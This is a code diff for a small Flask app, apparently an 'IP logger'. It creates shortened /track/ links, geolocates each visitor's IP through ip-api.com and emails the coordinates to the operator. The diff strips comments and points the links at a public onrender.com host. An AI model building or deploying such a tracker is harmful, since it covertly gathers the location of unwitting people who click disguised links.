@@ -11,7 +11,6 @@ EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
 TO_EMAIL = os.getenv("TO_EMAIL")
 DB_FILE = "url_db.json"
 
-# Load or save URL mappings
 def load_db():
     if os.path.exists(DB_FILE):
         with open(DB_FILE, 'r') as f:
@@ -22,7 +21,6 @@ def save_db(data):
     with open(DB_FILE, 'w') as f:
         json.dump(data, f)
 
-# Fetch IP geolocation
 def get_geolocation(ip):
     try:
         res = requests.get(f"http://ip-api.com/json/{ip}")
@@ -30,7 +28,6 @@ def get_geolocation(ip):
     except:
         return {}
 
-# Email alert
 def send_email_alert(ip_data, short_code):
     msg = EmailMessage()
     msg['Subject'] = f"[Visitor] Clicked on /track/{short_code}"
@@ -58,7 +55,6 @@ Coords: {ip_data.get('lat', 'N/A')} / {ip_data.get('lon', 'N/A')}
     except Exception as e:
         print("[✘] Email error:", e)
 
-# Home - Enter URL
 @app.route('/', methods=['GET', 'POST'])
 def index():
     if request.method == 'POST':
@@ -67,10 +63,9 @@ def index():
         db = load_db()
         db[short_code] = url
         save_db(db)
-        return render_template("index.html", short_url=f"http://127.0.0.1:5000/track/{short_code}")
+        return render_template("index.html", short_url=f"https://smart-ip-logger.onrender.com/track/{short_code}")
     return render_template("index.html")
 
-# Tracker
 @app.route('/track/<code>')
 def track(code):
     db = load_db()
